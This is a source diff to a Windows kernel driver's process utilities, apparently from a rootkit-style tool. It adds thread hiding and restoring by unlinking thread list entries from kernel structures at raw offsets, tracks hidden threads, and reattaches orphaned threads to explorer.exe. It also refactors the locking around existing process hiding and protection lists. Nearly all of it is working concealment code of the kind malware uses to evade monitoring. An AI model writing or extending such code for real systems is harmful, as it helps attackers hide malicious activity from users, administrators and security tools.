@@ -6,22 +6,29 @@ ProcessUtils::ProcessUtils() {
 	this->ProtectedProcesses.PidsCount = 0;
 	this->ProtectedProcesses.LastIndex = 0;
 	memset(&this->ProtectedProcesses.Processes, 0, sizeof(this->ProtectedProcesses.Processes));
+	this->ProtectedProcesses.Lock.Init();
 
 	this->HiddenProcesses.PidsCount = 0;
 	this->HiddenProcesses.LastIndex = 0;
 	memset(&this->HiddenProcesses.Processes, 0, sizeof(this->HiddenProcesses.Processes));
-	this->ProcessesLock.Init();
+	this->HiddenProcesses.Lock.Init();
 
 	this->ProtectedThreads.TidsCount = 0;
 	this->ProtectedThreads.LastIndex = 0;
 	memset(&this->ProtectedThreads.Threads, 0, sizeof(this->ProtectedThreads.Threads));
-	this->ThreadsLock.Init();
+	this->ProtectedThreads.Lock.Init();
+
+	this->HiddenThreads.TidsCount = 0;
+	this->HiddenThreads.LastIndex = 0;
+	memset(&this->HiddenThreads.HiddenThreads, 0, sizeof(this->HiddenThreads.HiddenThreads));
+	this->HiddenThreads.Lock.Init();
 }
 
 ProcessUtils::~ProcessUtils() {
 	ClearProtectedProcesses();
 	ClearHiddenProcesses();
 	ClearProtectedThreads();
+	ClearHiddenThreads();
 }
 
 /*
@@ -157,7 +164,6 @@ NTSTATUS ProcessUtils::UnhideProcess(ULONG pid) {
 	NTSTATUS status = STATUS_SUCCESS;
 	PLIST_ENTRY entryToRestore;
 
-	AutoLock locker(this->ProcessesLock);
 	entryToRestore = GetHiddenProcess(pid);
 
 	if (!entryToRestore)
@@ -212,12 +218,25 @@ NTSTATUS ProcessUtils::HideThread(ULONG tid) {
 	if (!NT_SUCCESS(status))
 		return status;
 
+	PEPROCESS owningProcess = IoThreadToProcess(targetThread);
+
+	if (!owningProcess) {
+		ObDereferenceObject(targetThread);
+		return STATUS_NOT_FOUND;
+	}
+
+	HANDLE owningPid = PsGetProcessId(owningProcess);
+
+	if (owningPid == 0) {
+		ObDereferenceObject(targetThread);
+		return STATUS_NOT_FOUND;
+	}
+
 	// Using the ThreadListEntry lock to avoid accessing problems.
 	PLIST_ENTRY threadListEntry = (PLIST_ENTRY)((ULONG_PTR)targetThread + threadListEntryOffset);
 	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetThread + lockOffset);
 
 	ExAcquirePushLockExclusive(listLock);
-
 	__try {
 		RemoveEntryList(threadListEntry);
 	}
@@ -227,6 +246,124 @@ NTSTATUS ProcessUtils::HideThread(ULONG tid) {
 
 	ExReleasePushLockExclusive(listLock);
 	ObDereferenceObject(targetThread);
+
+	if (NT_SUCCESS(status)) {
+		HiddenThread thread{ HandleToUlong(owningPid), tid, threadListEntry};
+		AddHiddenThread(thread);
+	}
+	return status;
+}
+
+/*
+* Description:
+* UnhideThread is responsible for restoring a thread by modifying the thread head list.
+*
+* Parameters:
+* @tid	  [ULONG]	 -- TID to restore.
+*
+* Returns:
+* @status [NTSTATUS] -- Whether successfully restored or not.
+*/
+NTSTATUS ProcessUtils::UnhideThread(ULONG tid) {
+	NTSTATUS status = STATUS_SUCCESS;
+	PEPROCESS owningProcess = NULL;
+	HiddenThread thread = GetHiddenThread(tid);
+
+	if (thread.Tid == 0)
+		return STATUS_NOT_FOUND;
+
+	ULONG lockOffset = GetProcessLockOffset();
+	ULONG threadListHeadOffset = GetThreadListHeadOffset();
+
+	if (threadListHeadOffset == (ULONG)STATUS_UNSUCCESSFUL || lockOffset == (ULONG)STATUS_UNSUCCESSFUL)
+		return STATUS_NOT_FOUND;
+
+	status = PsLookupProcessByProcessId(UlongToHandle(thread.Pid), &owningProcess);
+
+	// As backup, if the previous owning process is not found attach the thread to explorer.
+	if (!NT_SUCCESS(status)) {
+		if (status != STATUS_NOT_FOUND)
+			return status;
+
+		ULONG explorerPid = 0;
+		status = FindPidByName(L"explorer.exe", &explorerPid);
+
+		if (!NT_SUCCESS(status))
+			return status;
+
+		status = PsLookupProcessByProcessId(UlongToHandle(explorerPid), &owningProcess);
+
+		if (!NT_SUCCESS(status))
+			return status;
+	}
+
+	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)owningProcess + lockOffset);
+	ExAcquirePushLockExclusive(listLock);
+	PLIST_ENTRY threadListHead = (PLIST_ENTRY)((ULONG_PTR)owningProcess + threadListHeadOffset);
+
+	__try {
+		InsertTailList(threadListHead, thread.ListEntry);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		status = STATUS_UNSUCCESSFUL;
+	}
+
+	ExReleasePushLockExclusive(listLock);
+	ObDereferenceObject(owningProcess);
+	return status;
+}
+
+/*
+* Description:
+* UnhideThread is responsible for restoring a thread by modifying the thread head list.
+*
+* Parameters:
+* @thread [HiddenThread] -- Thread to restore.
+*
+* Returns:
+* @status [NTSTATUS]	 -- Whether successfully restored or not.
+*/
+NTSTATUS ProcessUtils::UnhideThread(HiddenThread thread) {
+	NTSTATUS status = STATUS_SUCCESS;
+	PEPROCESS owningProcess = NULL;
+	ULONG lockOffset = GetProcessLockOffset();
+	ULONG threadListHeadOffset = GetThreadListHeadOffset();
+
+	if (threadListHeadOffset == (ULONG)STATUS_UNSUCCESSFUL || lockOffset == (ULONG)STATUS_UNSUCCESSFUL)
+		return STATUS_NOT_FOUND;
+
+	status = PsLookupProcessByProcessId(UlongToHandle(thread.Pid), &owningProcess);
+
+	// As backup, if the previous owning process is not found attach the thread to explorer.
+	if (!NT_SUCCESS(status)) {
+		if (status != STATUS_NOT_FOUND)
+			return status;
+
+		ULONG explorerPid = 0;
+		status = FindPidByName(L"explorer.exe", &explorerPid);
+
+		if (!NT_SUCCESS(status))
+			return status;
+
+		status = PsLookupProcessByProcessId(UlongToHandle(explorerPid), &owningProcess);
+
+		if (!NT_SUCCESS(status))
+			return status;
+	}
+
+	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)owningProcess + lockOffset);
+	ExAcquirePushLockExclusive(listLock);
+	PLIST_ENTRY threadListHead = (PLIST_ENTRY)((ULONG_PTR)owningProcess + threadListHeadOffset);
+
+	__try {
+		InsertTailList(threadListHead, thread.ListEntry);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		status = STATUS_UNSUCCESSFUL;
+	}
+
+	ExReleasePushLockExclusive(listLock);
+	ObDereferenceObject(owningProcess);
 	return status;
 }
 
@@ -335,7 +472,9 @@ NTSTATUS ProcessUtils::FindPidByName(WCHAR* processName, ULONG* pid) {
 * Returns:
 * @status [bool]  -- Whether successfully added or not.
 */
-bool ProcessUtils::AddHiddenProcess(PLIST_ENTRY entry, DWORD pid) {
+bool ProcessUtils::AddHiddenProcess(PLIST_ENTRY entry, ULONG pid) {
+	AutoLock lock(this->HiddenProcesses.Lock);
+
 	for (ULONG i = 0; i < MAX_PIDS; i++) {
 		if (this->HiddenProcesses.Processes[i].Pid == 0) {
 			this->HiddenProcesses.Processes[i].ListEntry = entry;
@@ -360,7 +499,8 @@ bool ProcessUtils::AddHiddenProcess(PLIST_ENTRY entry, DWORD pid) {
 * Returns:
 * @entry  [PLIST_ENTRY] -- If found, the process list entry.
 */
-PLIST_ENTRY ProcessUtils::GetHiddenProcess(DWORD pid) {
+PLIST_ENTRY ProcessUtils::GetHiddenProcess(ULONG pid) {
+	AutoLock locker(this->HiddenProcesses.Lock);
 	PLIST_ENTRY entry = NULL;
 	ULONG newLastIndex = 0;
 
@@ -391,7 +531,7 @@ PLIST_ENTRY ProcessUtils::GetHiddenProcess(DWORD pid) {
 * @status [bool]  -- Whether found or not.
 */
 bool ProcessUtils::FindProcess(ULONG pid) {
-	AutoLock locker(this->ProcessesLock);
+	AutoLock locker(this->ProtectedProcesses.Lock);
 
 	for (ULONG i = 0; i <= this->ProtectedProcesses.LastIndex; i++)
 		if (this->ProtectedProcesses.Processes[i] == pid)
@@ -410,7 +550,7 @@ bool ProcessUtils::FindProcess(ULONG pid) {
 * @status [bool]  -- Whether successfully added or not.
 */
 bool ProcessUtils::AddProcess(ULONG pid) {
-	AutoLock locker(this->ProcessesLock);
+	AutoLock locker(this->ProtectedProcesses.Lock);
 
 	for (ULONG i = 0; i < MAX_PIDS; i++)
 		if (this->ProtectedProcesses.Processes[i] == 0) {
@@ -436,7 +576,7 @@ bool ProcessUtils::AddProcess(ULONG pid) {
 */
 bool ProcessUtils::RemoveProcess(ULONG pid) {
 	ULONG newLastIndex = 0;
-	AutoLock locker(this->ProcessesLock);
+	AutoLock locker(this->ProtectedProcesses.Lock);
 
 	for (ULONG i = 0; i <= this->ProtectedProcesses.LastIndex; i++) {
 		if (this->ProtectedProcesses.Processes[i] == pid) {
@@ -464,7 +604,7 @@ bool ProcessUtils::RemoveProcess(ULONG pid) {
 * @status [bool]  -- Whether found or not.
 */
 bool ProcessUtils::FindThread(ULONG tid) {
-	AutoLock locker(this->ThreadsLock);
+	AutoLock locker(this->ProtectedThreads.Lock);
 
 	for (ULONG i = 0; i <= this->ProtectedThreads.LastIndex; i++)
 		if (this->ProtectedThreads.Threads[i] == tid)
@@ -483,7 +623,7 @@ bool ProcessUtils::FindThread(ULONG tid) {
 * @status [bool]  -- Whether successfully added or not.
 */
 bool ProcessUtils::AddThread(ULONG tid) {
-	AutoLock locker(this->ThreadsLock);
+	AutoLock locker(this->ProtectedThreads.Lock);
 
 	for (ULONG i = 0; i < MAX_TIDS; i++)
 		if (this->ProtectedThreads.Threads[i] == 0) {
@@ -509,7 +649,7 @@ bool ProcessUtils::AddThread(ULONG tid) {
 */
 bool ProcessUtils::RemoveThread(ULONG tid) {
 	ULONG newLastIndex = 0;
-	AutoLock locker(this->ThreadsLock);
+	AutoLock locker(this->ProtectedThreads.Lock);
 
 	for (ULONG i = 0; i <= this->ProtectedThreads.LastIndex; i++) {
 		if (this->ProtectedThreads.Threads[i] == tid) {
@@ -524,6 +664,66 @@ bool ProcessUtils::RemoveThread(ULONG tid) {
 			newLastIndex = i;
 	}
 	return false;
+}
+
+/*
+* Description:
+* AddHiddenThread is responsible for adding a thread to the list of hidden threads.
+*
+* Parameters:
+* @thread [HiddenThread] -- thread to add.
+*
+* Returns:
+* @status [bool]		 -- Whether successfully added or not.
+*/
+bool ProcessUtils::AddHiddenThread(HiddenThread thread) {
+	AutoLock locker(this->HiddenThreads.Lock);
+
+	for (ULONG i = 0; i < MAX_TIDS; i++)
+		if (this->HiddenThreads.HiddenThreads[i].Tid == 0) {
+			this->HiddenThreads.HiddenThreads[i].Tid = thread.Tid;
+			this->HiddenThreads.HiddenThreads[i].Pid = thread.Pid;
+			this->HiddenThreads.HiddenThreads[i].ListEntry = thread.ListEntry;
+			this->HiddenThreads.TidsCount++;
+
+			if (i > this->HiddenThreads.LastIndex)
+				this->HiddenThreads.LastIndex = i;
+			return true;
+		}
+	return false;
+}
+
+/*
+* Description:
+* GetHiddenThread is responsible for searching if a thread exists in the list of hidden threads.
+*
+* Parameters:
+* @tid	  [ULONG]	    -- TID to search.
+*
+* Returns:
+* @entry  [PLIST_ENTRY] -- If found, the thread list entry.
+*/
+HiddenThread ProcessUtils::GetHiddenThread(ULONG tid) {
+	AutoLock locker(this->HiddenThreads.Lock);
+	HiddenThread entry{};
+	ULONG newLastIndex = 0;
+
+	for (ULONG i = 0; i <= this->HiddenThreads.LastIndex; i++) {
+		if (this->HiddenThreads.HiddenThreads[i].Tid == tid) {
+			entry.Tid = tid;
+			entry.ListEntry = this->HiddenThreads.HiddenThreads[i].ListEntry;
+			entry.Pid = this->HiddenThreads.HiddenThreads[i].Pid;
+			this->HiddenThreads.HiddenThreads[i].Tid = 0;
+
+			if (i == this->HiddenThreads.LastIndex)
+				this->HiddenThreads.LastIndex = newLastIndex;
+			this->HiddenThreads.TidsCount--;
+			break;
+		}
+		else if (this->HiddenThreads.HiddenThreads[i].Tid != 0)
+			newLastIndex = i;
+	}
+	return entry;
 }
 
 /*
@@ -616,7 +816,7 @@ NTSTATUS ProcessUtils::SetProcessSignature(ProcessSignature* ProcessSignature) {
 * There is no return value.
 */
 void ProcessUtils::ClearProtectedProcesses() {
-	AutoLock locker(this->ProcessesLock);
+	AutoLock locker(this->ProtectedProcesses.Lock);
 
 	memset(&this->ProtectedProcesses.Processes, 0, sizeof(this->ProtectedProcesses.Processes));
 	this->ProtectedProcesses.PidsCount = 0;
@@ -634,7 +834,7 @@ void ProcessUtils::ClearProtectedProcesses() {
 * There is no return value.
 */
 void ProcessUtils::ClearHiddenProcesses() {
-	AutoLock locker(this->ProcessesLock);
+	AutoLock locker(this->HiddenProcesses.Lock);
 
 	memset(&this->HiddenProcesses.Processes, 0, sizeof(this->HiddenProcesses.Processes));
 	this->HiddenProcesses.PidsCount = 0;
@@ -652,11 +852,34 @@ void ProcessUtils::ClearHiddenProcesses() {
 * There is no return value.
 */
 void ProcessUtils::ClearProtectedThreads() {
-	AutoLock locker(this->ThreadsLock);
+	AutoLock locker(this->ProtectedThreads.Lock);
 
 	memset(&this->ProtectedThreads.Threads, 0, sizeof(this->ProtectedThreads.Threads));
 	this->ProtectedThreads.TidsCount = 0;
 	this->ProtectedThreads.LastIndex = 0;
+}
+
+/*
+* Description:
+* ClearHiddenThreads is responsible for cleaning the hidden threads array.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* There is no return value.
+*/
+void ProcessUtils::ClearHiddenThreads() {
+	AutoLock locker(this->HiddenThreads.Lock);
+
+	for (ULONG i = 0; i <= this->HiddenThreads.LastIndex; i++) {
+		if (this->HiddenThreads.HiddenThreads[i].Tid != 0)
+			UnhideThread(this->HiddenThreads.HiddenThreads[i]);
+	}
+
+	memset(&this->HiddenThreads.HiddenThreads, 0, sizeof(this->HiddenThreads.HiddenThreads));
+	this->HiddenThreads.TidsCount = 0;
+	this->HiddenThreads.LastIndex = 0;
 }
 
 /*
@@ -672,7 +895,7 @@ void ProcessUtils::ClearProtectedThreads() {
 void ProcessUtils::QueryProtectedProcesses(OutputProtectedProcessesList* list) {
 	ULONG outputIndex = 0;
 
-	AutoLock locker(this->ProcessesLock);
+	AutoLock locker(this->ProtectedProcesses.Lock);
 	list->PidsCount = this->ProtectedProcesses.PidsCount;
 
 	for (ULONG i = 0; i < this->ProtectedProcesses.PidsCount; i++) {
@@ -696,7 +919,7 @@ void ProcessUtils::QueryProtectedProcesses(OutputProtectedProcessesList* list) {
 void ProcessUtils::QueryProtectedThreads(OutputThreadsList* list) {
 	ULONG outputIndex = 0;
 
-	AutoLock locker(this->ThreadsLock);
+	AutoLock locker(this->ProtectedThreads.Lock);
 	list->TidsCount = this->ProtectedThreads.TidsCount;
 
 	for (ULONG i = 0; i < this->ProtectedThreads.TidsCount; i++) {
